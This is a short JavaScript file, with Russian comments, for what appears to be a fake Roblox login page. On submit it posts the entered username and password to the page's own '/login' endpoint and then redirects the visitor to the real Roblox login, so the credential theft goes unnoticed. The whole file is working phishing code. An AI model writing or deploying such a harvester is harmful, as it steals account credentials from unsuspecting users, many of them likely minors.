document.addEventListener("DOMContentLoaded", () => {
    const loginForm = document.getElementById('loginForm');
    
    if (loginForm) {
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            const loginBtn = document.querySelector('.demo-submit');
            
            if (loginBtn) {
                loginBtn.textContent = "Loading...";
                loginBtn.disabled = true;
            }

            try {
                // Отправляем данные на сервер
                await fetch('/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });
            } catch (error) {
                console.error("Ошибка:", error);
            }

            // Задержка и редирект на настоящий сайт
            setTimeout(() => {
                window.location.href = "https://www.roblox.com/login";
            }, 1500);
        });
    }
});
